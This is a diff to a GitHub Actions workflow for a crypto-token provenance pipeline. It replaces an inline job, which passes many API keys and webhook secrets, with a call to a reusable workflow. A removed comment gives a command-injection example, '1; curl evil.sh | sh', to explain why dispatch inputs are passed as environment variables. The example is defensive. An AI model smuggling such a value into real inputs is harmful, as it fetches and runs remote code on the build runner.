@@ -32,90 +32,13 @@ concurrency:
 
 jobs:
   run:
-    runs-on: ubuntu-latest
-    timeout-minutes: 45
-    steps:
-      - uses: actions/checkout@v4
-
-      - uses: oven-sh/setup-bun@v2
-        with:
-          bun-version: latest
-
-      - name: Cache Bun install
-        uses: actions/cache@v4
-        with:
-          path: ~/.bun/install/cache
-          key: bun-${{ runner.os }}-${{ hashFiles('bun.lock') }}
-          restore-keys: bun-${{ runner.os }}-
-
-      - name: Install dependencies
-        run: bun install --frozen-lockfile
-
-      # The DexTools source drives a real browser; the other two sources are
-      # plain HTTP and keep working if this step fails.
-      - name: Install Chromium
-        run: bunx playwright install --with-deps chromium
-
-      - name: Migrate database
-        run: bun run apps/worker/src/cli.ts migrate
-        env:
-          DATABASE_URL: ${{ secrets.DATABASE_URL }}
-          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
-
-      # Dispatch inputs reach the shell as env vars, never as `${{ }}` inside the
-      # script. Interpolation happens before bash sees the line, so a `limit` of
-      # `1; curl evil.sh | sh` would have been pasted in as a command. They are
-      # also quoted into an array rather than word-split out of one string.
-      - name: Run pipeline
-        run: |
-          set -o pipefail
-          args=(run)
-          [ "$INPUT_DRY_RUN" = "true" ] && args+=(--dry-run)
-          [ -n "$INPUT_LIMIT" ] && args+=(--limit "$INPUT_LIMIT")
-          [ -n "$INPUT_CHAINS" ] && args+=(--chains "$INPUT_CHAINS")
-          bun run apps/worker/src/cli.ts "${args[@]}" 2>&1 | tee provenance-run.log
-        env:
-          INPUT_DRY_RUN: ${{ inputs.dry_run }}
-          INPUT_LIMIT: ${{ inputs.limit }}
-          INPUT_CHAINS: ${{ inputs.chains }}
-          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
-          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
-          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
-          MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
-          DASHSCOPE_API_KEY: ${{ secrets.DASHSCOPE_API_KEY }}
-          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
-          OPENAI_COMPATIBLE_API_KEY: ${{ secrets.OPENAI_COMPATIBLE_API_KEY }}
-          OPENAI_COMPATIBLE_BASE_URL: ${{ secrets.OPENAI_COMPATIBLE_BASE_URL }}
-          DATABASE_URL: ${{ secrets.DATABASE_URL }}
-          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
-          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
-          ALERT_WEBHOOK_URL: ${{ secrets.ALERT_WEBHOOK_URL }}
-          ALERT_FILE_SINK: alerts.jsonl
-          MAX_TOKENS_PER_RUN: ${{ vars.MAX_TOKENS_PER_RUN }}
-          MIN_LIQUIDITY_USD: ${{ vars.MIN_LIQUIDITY_USD }}
-          MIN_VOLUME_24H_USD: ${{ vars.MIN_VOLUME_24H_USD }}
-          MIN_POOL_AGE_HOURS: ${{ vars.MIN_POOL_AGE_HOURS }}
-          REANALYSE_AFTER_HOURS: ${{ vars.REANALYSE_AFTER_HOURS }}
-          ALERT_SCORE_THRESHOLD: ${{ vars.ALERT_SCORE_THRESHOLD }}
-          LLM_MODEL: ${{ vars.LLM_MODEL }}
-          LLM_EXTRACT_MODEL: ${{ vars.LLM_EXTRACT_MODEL }}
-          LLM_TRIAGE_MODEL: ${{ vars.LLM_TRIAGE_MODEL }}
-          LLM_PRICING: ${{ vars.LLM_PRICING }}
-          LLM_MAX_COST_USD_PER_RUN: ${{ vars.LLM_MAX_COST_USD_PER_RUN }}
-          LLM_MAX_WEB_SEARCHES: ${{ vars.LLM_MAX_WEB_SEARCHES }}
-          PROVENANCE_CHAINS: ${{ vars.PROVENANCE_CHAINS }}
-          LOG_LEVEL: ${{ vars.LOG_LEVEL }}
-
-      # Uploaded even on failure: a failed run's log is the only record of why.
-      - name: Upload run artifacts
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: provenance-run-${{ github.run_id }}
-          path: |
-            provenance-run.log
-            alerts.jsonl
-          if-no-files-found: ignore
-          retention-days: 14
+    uses: ./.github/workflows/run-lane.yml
+    secrets: inherit
+    with:
+      dry_run: ${{ inputs.dry_run == true }}
+      limit: ${{ inputs.limit || '' }}
+      chains: ${{ inputs.chains || '' }}
+      browser: true
+      timeout_minutes: 45
+      artifact_prefix: provenance-run
+      retention_days: 14
